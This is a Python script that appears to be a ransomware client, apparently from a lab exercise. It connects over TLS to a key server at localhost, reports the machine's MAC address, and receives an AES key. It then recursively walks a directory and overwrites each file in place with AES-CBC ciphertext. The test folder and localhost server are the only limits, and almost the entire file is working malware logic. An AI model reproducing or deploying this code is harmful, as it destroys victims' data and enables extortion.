import socket
import ssl
import uuid
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


def encrypt_file_with_aes(file_path, aes_encryption_key):
    """
    :param file_path: the file that will be encrypted.
    :param aes_encryption_key: the encryption key length should be(16/24/32) byte according aes standards.
    :return none:
    :Description: this function encrypts file with aes encryption.
    the aes mode is CBC which is secure, furthermore I used the
    initialization vector(random 16 bytes) for more secure in order
    that even same plaintext will produce different ciphertexts.
    I created the new file in this way : the first 16 bytes contains
    the initialization vector and the rest of the file is the ciphertext.
    """
    with open(file_path, 'rb') as file:
        file_data = file.read()

    initialization_vector = get_random_bytes(16)

    cipher = AES.new(aes_encryption_key, AES.MODE_CBC, initialization_vector)
    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(initialization_vector + encrypted_data)


def encrypt_files(starting_directory, aes_encryption_key):
    """
    :param starting_directory: starting point for the encryption.
    :param aes_encryption_key: the encryption key length should be(16/24/32) byte according aes standards
    :return none:
    :Description: this function will iterate the file system from the starting directory
    in order to encrypt the systems files by using the encrypt_file_with_aes.
    """
    for directory_path, sub_directories, files in os.walk(starting_directory):
        for file_name in files:
            file_path = os.path.join(directory_path, file_name)
            encrypt_file_with_aes(file_path, aes_encryption_key)


def get_mac_address():
    """
    :param: none
    :return str:
    :Description: this function return the mac address of the current pc,
    the function return the mac in this format : 00-B0-D0-63-C2-26.
    """
    mac = hex(uuid.getnode())[2:].upper()
    mac = "-".join(mac[i:i+2] for i in range(0, len(mac), 2))

    return mac


DESTINATION_IP = '127.0.0.1'
DESTINATION_PORT = 7777

ssl_context = ssl.create_default_context()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket_ssl = ssl_context.wrap_socket(client_socket, server_hostname='localhost')

client_socket_ssl.connect((DESTINATION_IP, DESTINATION_PORT))

client_socket_ssl.sendall("Encrypt".encode())
client_socket_ssl.sendall(get_mac_address().encode())

aes_encryption_key = client_socket_ssl.recv(1024)

print(f"Received: {aes_encryption_key}")

encrypt_files("D:\\MyData\\encryption_testing", aes_encryption_key)

client_socket_ssl.close()